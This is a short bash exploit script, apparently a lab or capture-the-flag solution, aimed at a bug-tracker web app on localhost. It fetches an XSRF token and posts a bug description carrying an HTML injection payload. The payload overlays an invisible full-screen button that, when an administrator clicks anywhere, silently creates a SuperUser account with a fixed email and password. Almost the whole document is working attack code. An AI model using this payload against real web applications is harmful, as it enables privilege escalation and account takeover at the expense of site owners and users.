#!/bin/bash

if [[ $# -eq 0 ]]
then
    echo "USAGE: $0 <cookieJar>"
    exit 1
fi

rhost="http://localhost"
cookieJar=$1

xsrf_token=$(curl -s -b $cookieJar "$rhost/Bugs/Details?name=Off%20by%20One%20Bug" | htmlq 'input[name=xsrf_token]' -a value)

curl -s -i -b $cookieJar \
    --data-urlencode 'Bug.Name=Off by One Bug' \
    --data-urlencode 'Bug.Description=WHATEVER"><style>.modal .modal-content.is-normal{width:100%;height:100%;}.modal-card-head{width:50%;margin-top:5%;left:25%;}.modal-card-body{width:50%;height:50%;margin-top:0%;margin-left:25%;}</style><div style="position:absolute;top:0px;left:0px;z-index:41;"><input hidden name="Data.Email" value="gg@bugznet.com"><input hidden name="Data.Role" value="SuperUser"><input hidden name="Data.Password" value="12345678"><input hidden name="Data.ConfirmationPassword" value="12345678"><iframe name="blackhole" src="about:blank" style="display:none"></iframe><button type="submit" formtarget="blackhole" formaction="/Admin/Users/CreateEdit?handler=create" style="position:relative;width:1920px;height:1080px;opacity:0.001;z-index:999999;"></button></div><x x="' \
    --data-urlencode "xsrf_token=$xsrf_token" \
    "$rhost/Bugs/Details?name=Off%20by%20One%20Bug" 
echo "Now we wait for admin to trigger the Injection"
echo "Once triggered the user gg@bugznet.com with pass 12345678 will be created"
